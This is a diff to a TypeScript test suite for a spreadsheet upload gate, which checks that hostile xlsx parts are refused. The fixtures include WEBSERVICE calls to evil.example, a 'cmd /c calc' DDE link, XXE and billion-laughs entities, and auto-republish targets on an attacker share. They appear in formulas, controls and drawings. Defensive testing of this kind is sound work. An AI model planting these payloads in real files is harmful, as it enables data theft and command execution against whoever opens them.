@@ -794,8 +794,8 @@ describe('upload gate', () => {
 
 // The reader opens `xl/_rels/workbook.xml.rels`, `xl/workbook.xml` and the Target of
 // every relationship typed styles, sharedStrings or worksheet (reader contract,
-// section 1). The gate budgets, scans, parses and returns exactly those parts; every
-// other entry is ignored.
+// section 1). The gate budgets, parses and returns exactly those parts; every other
+// kept XML entry is only content-scanned, and every other entry only counted.
 describe('upload gate: the parts the reader opens', () => {
   // The audit file: an element bomb over the whole weight budget in a part no
   // relationship names.
@@ -930,19 +930,24 @@ describe('upload gate: the parts the reader opens', () => {
       },
     ],
     [
-      'a document properties part with an unknown entity',
-      {
-        'docProps/app.xml':
-          '<?xml version="1.0"?><Properties><Company>A&nbsp;B</Company></Properties>',
-      },
-    ],
-    [
       'a part over the namespace-declaration cap',
       { 'xl/custom/ns.xml': partWithXmlns(MAX_XMLNS_DECLARATIONS_PER_PART + 1) },
     ],
   ])('accepts %s', async (_label, parts) => {
     const file = buildXlsxFixture([BASIC_SHEET], parts);
     expect(await readWorkbookGrid(file)).toEqual(BASIC_ROWS);
+  });
+
+  // The export hands every part on unchanged, so every kept XML part is content-scanned,
+  // the reader's or not (the content scan's own tests cover the formula rule there).
+  it('refuses a document properties part with an unknown entity as UNSAFE_CONTENT', () => {
+    const file = buildXlsxFixture([BASIC_SHEET], {
+      'docProps/app.xml':
+        '<?xml version="1.0"?><Properties><Company>A&nbsp;B</Company></Properties>',
+    });
+    const err = catchGuard(file, opts);
+    expect(err?.code).toBe('UNSAFE_CONTENT');
+    expect(err?.meta).toEqual({ entry: 'docProps/app.xml' });
   });
 
   // Every entry is inflated and counted, the reader's or not: the export unzips the
@@ -1332,5 +1337,365 @@ describe('upload gate: unsafe parts by declared type', () => {
       [SHEET_RELS_PART]: bytes,
     }));
     expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PACKAGE_PART);
+  });
+});
+
+const STRICT_WORKSHEET_REL = 'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet';
+const BYTE_ORDER_MARK = '\ufeff';
+const HYPERLINK_REL = `${OFFICE_REL}/hyperlink`;
+const DRAWING_REL = `${OFFICE_REL}/drawing`;
+const EVIL_CALL = 'WEBSERVICE(&quot;http://evil.example/&quot;)';
+const DDE_LINK = "cmd|'/c calc'!A0";
+const DRAWING_NS = 'http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing';
+const VML_NAMESPACES =
+  'xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" ' +
+  'xmlns:x="urn:schemas-microsoft-com:office:excel"';
+const WORKBOOK_WITH_ONE_SHEET_START =
+  `${XML_DECLARATION}<workbook xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_REL}">` +
+  '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>';
+
+/** A worksheet with one numeric cell, whose root holds `after` after its sheet data. */
+function sheetWithAfter(after: string): string {
+  return (
+    `${XML_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_REL}">` +
+    `<sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>${after}</worksheet>`
+  );
+}
+
+/** A worksheet whose one cell holds the formula `formula` (XML text). */
+function sheetWithFormula(formula: string): string {
+  return sheetWithAfter('').replace('<v>1</v>', `<f>${formula}</f><v>0</v>`);
+}
+
+/** The one-sheet workbook whose sheet is `sheetXml`, plus `parts`. */
+function bookWith(sheetXml: string, parts: Readonly<Record<string, string>> = {}): Buffer {
+  return buildXlsxFixture([{ name: 'Sheet1', xml: sheetXml }], parts);
+}
+
+/** `text` encoded UTF-16LE after a byte order mark. */
+function utf16WithMark(text: string): Uint8Array<ArrayBuffer> {
+  return Uint8Array.from(Buffer.from(`${BYTE_ORDER_MARK}${text}`, 'utf16le'));
+}
+
+/** The gate's error for `file` has `code`, `meta.reason` and `meta.entry`. */
+function expectGateEntry(
+  file: Buffer,
+  code: SpreadsheetFileErrorCode,
+  reason: string,
+  entry: string,
+): void {
+  const err = catchGuard(file, opts);
+  expect(err?.code).toBe(code);
+  expect(err?.meta).toEqual({ reason, entry });
+}
+
+const EVIL_SHEET_XML = sheetWithFormula(EVIL_CALL);
+
+// The gate keeps and scans every entry whose content is XML, whatever its name: an
+// opener finds a part by its relationship, and the export hands every entry on.
+describe('upload gate: parts chosen by content', () => {
+  it.each([
+    'xl/worksheets/sheet2.bin',
+    'xl/worksheets/sheet2.XML',
+    'xl/worksheets/sheet2.xml.bak',
+    'xl/worksheets/sheet2',
+  ])('refuses a formula in a worksheet stored as %s, named by the Strict type', (entry) => {
+    const file = workbookWith(
+      [SHEET_RELATIONSHIP, [STRICT_WORKSHEET_REL, entry.slice('xl/'.length)]],
+      { [entry]: EVIL_SHEET_XML },
+    );
+    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
+  });
+
+  it.each(['xl/worksheets/Sheet1.XML', 'xl/worksheets/sheet1.XML'])(
+    'refuses a formula in %s beside the worksheet the reader opens',
+    (entry) => {
+      const file = buildXlsxFixture([BASIC_SHEET], { [entry]: EVIL_SHEET_XML });
+      expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
+    },
+  );
+
+  it('refuses a DOCTYPE in a VML drawing as UNSAFE_CONTENT', () => {
+    const vml = `<xml ${VML_NAMESPACES}><!DOCTYPE x [<!ENTITY e SYSTEM "http://evil.example/">]><v:shape id="b"/></xml>`;
+    const file = buildXlsxFixture([BASIC_SHEET], { 'xl/drawings/vmlDrawing1.vml': vml });
+    expect(catchGuard(file, opts)?.code).toBe('UNSAFE_CONTENT');
+  });
+
+  it('refuses a billion-laughs theme stored as .dat as UNSAFE_CONTENT', () => {
+    const theme =
+      `${XML_DECLARATION}<!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]>` +
+      '<a:theme xmlns:a="urn:a">&b;</a:theme>';
+    const file = buildXlsxFixture([BASIC_SHEET], { 'xl/theme/theme1.dat': theme });
+    expect(catchGuard(file, opts)?.code).toBe('UNSAFE_CONTENT');
+  });
+
+  it('refuses a worksheet stored as .bin in UTF-16 with a DOCTYPE as CORRUPT_FILE part-encoding', () => {
+    const entry = 'xl/worksheets/sheet3.bin';
+    const xml = EVIL_SHEET_XML.replace(
+      XML_DECLARATION,
+      '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY a SYSTEM "http://evil.example/">]>',
+    );
+    const file = rezipped(
+      workbookWith([SHEET_RELATIONSHIP, [STRICT_WORKSHEET_REL, 'worksheets/sheet3.bin']]),
+      (entries) => ({ ...entries, [entry]: utf16WithMark(xml) }),
+    );
+    expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PART_ENCODING, entry);
+  });
+
+  it('refuses a UTF-16 relationships part of a chart stored as .bin as CORRUPT_FILE part-encoding', () => {
+    const entry = 'xl/charts/_rels/chart1.bin.rels';
+    const rels = relsXml([[`${OFFICE_REL}/oleObject`, 'x.bin']]).replace(
+      'encoding="UTF-8"',
+      'encoding="UTF-16"',
+    );
+    const file = rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) => ({
+      ...entries,
+      [entry]: utf16WithMark(rels),
+    }));
+    expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PART_ENCODING, entry);
+  });
+
+  it('refuses a UTF-7 relationships part of a chart stored as .bin as CORRUPT_FILE package-part', () => {
+    const rels = relsXml([[`${OFFICE_REL}/oleObject`, 'x.bin']]).replace(
+      XML_DECLARATION,
+      UTF7_DECLARATION,
+    );
+    const file = buildXlsxFixture([BASIC_SHEET], {
+      'xl/charts/_rels/chart1.bin.rels': utf7Markup(rels).replace(
+        utf7Markup(UTF7_DECLARATION),
+        UTF7_DECLARATION,
+      ),
+    });
+    expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PACKAGE_PART);
+  });
+
+  it.each(['xl/drawings/vmlDrawing1.vml', 'xl/x/a.xml', 'xl/x/_rels/a.bin.rels'])(
+    'refuses %s holding no XML as CORRUPT_FILE part-encoding',
+    (entry) => {
+      const file = buildXlsxFixture([BASIC_SHEET], { [entry]: 'not xml' });
+      expectGateEntry(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PART_ENCODING, entry);
+    },
+  );
+
+  it('accepts an SVG image and a binary entry', () => {
+    const file = buildXlsxFixture([BASIC_SHEET], {
+      'xl/media/image1.svg': '<svg xmlns="http://www.w3.org/2000/svg"/>',
+      'xl/printerSettings/printerSettings1.bin': 'binary',
+    });
+    expect(catchGuard(file, opts)).toBeNull();
+  });
+
+  // Text that starts with '=', '+', '-' or '@' is a string in xlsx: shown, never evaluated.
+  it('accepts cell text that looks like a formula', () => {
+    const sheet = sheetWithAfter('').replace(
+      '<c r="A1"><v>1</v></c>',
+      '<c r="A1" t="inlineStr"><is><t>=WEBSERVICE("http://evil.example/?"&amp;B1)</t></is></c>' +
+        `<c r="B1" t="str"><v>=${DDE_LINK}</v></c>`,
+    );
+    expect(catchGuard(bookWith(sheet), opts)).toBeNull();
+  });
+});
+
+/** A drawing part whose one anchor holds `shape`. */
+function drawingWith(shape: string): string {
+  return (
+    `${XML_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:r="${OFFICE_REL}">` +
+    `<xdr:twoCellAnchor>${shape}</xdr:twoCellAnchor></xdr:wsDr>`
+  );
+}
+
+// Every field Excel evaluates as a formula, in every XML part, and the elements of
+// embedded objects, controls and web publishing, wherever they stand.
+describe('upload gate: formula fields and active elements of every part', () => {
+  it.each<[label: string, entry: string, file: Buffer]>([
+    [
+      'a defined name calling WEBSERVICE',
+      WORKBOOK_PART,
+      bookWith(EVIL_SHEET_XML.replace(EVIL_CALL, '1'), {
+        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<definedNames><definedName name="leak">${EVIL_CALL}</definedName></definedNames></workbook>`,
+      }),
+    ],
+    [
+      'a defined name holding a DDE link',
+      WORKBOOK_PART,
+      bookWith(sheetWithAfter(''), {
+        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<definedNames><definedName name="pwn">${DDE_LINK}</definedName></definedNames></workbook>`,
+      }),
+    ],
+    [
+      'a data validation formula',
+      SHEET_PART,
+      bookWith(
+        sheetWithAfter(
+          `<dataValidations count="1"><dataValidation type="custom" sqref="A1"><formula1>ISNUMBER(${EVIL_CALL})</formula1></dataValidation></dataValidations>`,
+        ),
+      ),
+    ],
+    [
+      'a conditional format formula',
+      SHEET_PART,
+      bookWith(
+        sheetWithAfter(
+          `<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>${DDE_LINK}</formula></cfRule></conditionalFormatting>`,
+        ),
+      ),
+    ],
+    [
+      'a table calculated column formula',
+      'xl/tables/table1.xml',
+      bookWith(sheetWithAfter(''), {
+        'xl/tables/table1.xml': `${XML_DECLARATION}<table xmlns="${SPREADSHEET_NS}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><calculatedColumnFormula>${EVIL_CALL}</calculatedColumnFormula></tableColumn></tableColumns></table>`,
+      }),
+    ],
+    [
+      'a chart series DDE link',
+      'xl/charts/chart1.xml',
+      bookWith(sheetWithAfter(''), {
+        'xl/charts/chart1.xml': `${XML_DECLARATION}<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"><c:chart><c:plotArea><c:barChart><c:ser><c:val><c:numRef><c:f>${DDE_LINK}</c:f></c:numRef></c:val></c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>`,
+      }),
+    ],
+    [
+      'a pivot cache calculated field',
+      'xl/pivotCache/pivotCacheDefinition1.xml',
+      bookWith(sheetWithAfter(''), {
+        'xl/pivotCache/pivotCacheDefinition1.xml': `${XML_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="1"><cacheFields count="1"><cacheField name="x" formula="${EVIL_CALL}" databaseField="0"/></cacheFields></pivotCacheDefinition>`,
+      }),
+    ],
+    [
+      'a shape macro and text link',
+      'xl/drawings/drawing1.xml',
+      bookWith(sheetWithAfter(''), {
+        'xl/drawings/drawing1.xml': drawingWith(
+          `<xdr:sp macro="${DDE_LINK}" textlink="${EVIL_CALL}"/>`,
+        ),
+      }),
+    ],
+    [
+      'a form control macro',
+      'xl/ctrlProps/ctrlProp1.xml',
+      bookWith(sheetWithAfter(''), {
+        'xl/ctrlProps/ctrlProp1.xml': `${XML_DECLARATION}<formControlPr xmlns="urn:x14" objectType="Button" fmlaMacro="${EVIL_CALL}" fmlaLink="${DDE_LINK}"/>`,
+      }),
+    ],
+    [
+      'a VML button macro and cell link',
+      'xl/drawings/vmlDrawing1.vml',
+      bookWith(sheetWithAfter(''), {
+        'xl/drawings/vmlDrawing1.vml': `<xml ${VML_NAMESPACES}><v:shape id="b"><x:ClientData ObjectType="Button"><x:FmlaMacro>${EVIL_CALL}</x:FmlaMacro><x:FmlaLink>${DDE_LINK}</x:FmlaLink></x:ClientData></v:shape></xml>`,
+      }),
+    ],
+    [
+      'a formula in a second root element',
+      'xl/worksheets/sheet7.xml',
+      bookWith(sheetWithAfter(''), {
+        'xl/worksheets/sheet7.xml': `${XML_DECLARATION}<x/>${EVIL_SHEET_XML.slice(XML_DECLARATION.length)}`,
+      }),
+    ],
+  ])('refuses %s as UNSAFE_CONTENT unsafe-formula', (_label, entry, file) => {
+    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
+  });
+
+  it.each<[label: string, entry: string, file: Buffer]>([
+    [
+      'an oleObject named through an image relationship',
+      SHEET_PART,
+      bookWith(
+        sheetWithAfter(
+          '<oleObjects><oleObject progId="Package" dvAspect="DVASPECT_ICON" shapeId="1025" r:id="rId1" oleUpdate="OLEUPDATE_ALWAYS" autoLoad="1"/></oleObjects>',
+        ),
+        {
+          [SHEET_RELS_PART]: relsXml([[`${OFFICE_REL}/image`, '../media/ole1.bin']]),
+          'xl/media/ole1.bin': 'binary',
+        },
+      ),
+    ],
+    [
+      'an oleObject link attribute',
+      SHEET_PART,
+      bookWith(
+        sheetWithAfter(
+          `<oleObjects><oleObject progId="Package" link="${DDE_LINK}" shapeId="1025"/></oleObjects>`,
+        ),
+      ),
+    ],
+    [
+      'a form control',
+      SHEET_PART,
+      bookWith(
+        sheetWithAfter(
+          '<controls><control shapeId="1025" r:id="rId1" name="Button 1"/></controls>',
+        ),
+      ),
+    ],
+    [
+      'a web publishing item that republishes to a file share',
+      SHEET_PART,
+      bookWith(
+        sheetWithAfter(
+          '<webPublishItems count="1"><webPublishItem id="1" divId="d" sourceType="sheet" destinationFile="\\\\evil.example\\s\\x.htm" autoRepublish="1"/></webPublishItems>',
+        ),
+      ),
+    ],
+    [
+      'a web publishing object that republishes to a web address',
+      WORKBOOK_PART,
+      bookWith(sheetWithAfter(''), {
+        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<webPublishing allowPng="1"/><webPublishObjects count="1"><webPublishObject id="1" divId="d" sourceObject="Sheet1!A1:Z99" destinationFile="http://evil.example/drop.htm" autoRepublish="1"/></webPublishObjects></workbook>`,
+      }),
+    ],
+  ])('refuses %s as UNSAFE_CONTENT unsafe-part', (_label, entry, file) => {
+    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, entry);
+  });
+
+  // A cell value a rich-data web image shows, with no formula: the address is an
+  // external hyperlink-typed relationship, which only a worksheet's click may follow.
+  it('refuses a rich-data web image as UNSAFE_CONTENT unsafe-part', () => {
+    const imageRels = 'xl/richData/_rels/rdRichValueWebImage.xml.rels';
+    const file = bookWith(sheetWithAfter('').replace('<c r="A1">', '<c r="A1" t="e" vm="1">'), {
+      'xl/richData/rdRichValueWebImage.xml': `${XML_DECLARATION}<webImagesSrd xmlns="urn:wi" xmlns:r="${OFFICE_REL}"><webImageSrd><address r:id="rId1"/></webImageSrd></webImagesSrd>`,
+      [imageRels]: relsXml([[HYPERLINK_REL, 'https://evil.example/pixel.png?who=opened']]).replace(
+        '/>',
+        ' TargetMode="External"/>',
+      ),
+    });
+    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, imageRels);
+  });
+
+  it('refuses a picture whose click opens an external hyperlink of its drawing', () => {
+    const drawingRels = 'xl/drawings/_rels/drawing1.xml.rels';
+    const file = bookWith(sheetWithAfter('<drawing r:id="rId1"/>'), {
+      [SHEET_RELS_PART]: relsXml([[DRAWING_REL, '../drawings/drawing1.xml']]),
+      'xl/drawings/drawing1.xml': drawingWith(
+        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="p"><a:hlinkClick xmlns:a="urn:a" r:id="rId1"/></xdr:cNvPr></xdr:nvPicPr></xdr:pic>',
+      ),
+      [drawingRels]: relsXml([[HYPERLINK_REL, 'https://example.com/a']]).replace(
+        '/>',
+        ' TargetMode="External"/>',
+      ),
+    });
+    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, drawingRels);
+  });
+
+  it('accepts an external https hyperlink of a worksheet cell', () => {
+    const file = bookWith(
+      sheetWithAfter('<hyperlinks><hyperlink ref="A1" r:id="rId1"/></hyperlinks>'),
+      {
+        [SHEET_RELS_PART]: relsXml([[HYPERLINK_REL, 'https://www.trendyol.com/x']]).replace(
+          '/>',
+          ' TargetMode="External"/>',
+        ),
+      },
+    );
+    expect(catchGuard(file, opts)).toBeNull();
+  });
+
+  it("accepts Excel's empty macro and text link on a shape, and the 3ve4 data validation", () => {
+    const file = bookWith(
+      sheetWithAfter(
+        '<dataValidations count="1"><dataValidation type="list" sqref="T2:T34" allowBlank="true"><formula1>OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))</formula1></dataValidation></dataValidations>',
+      ),
+      { 'xl/drawings/drawing1.xml': drawingWith('<xdr:sp macro="" textlink=""/>') },
+    );
+    expect(catchGuard(file, opts)).toBeNull();
   });
 });
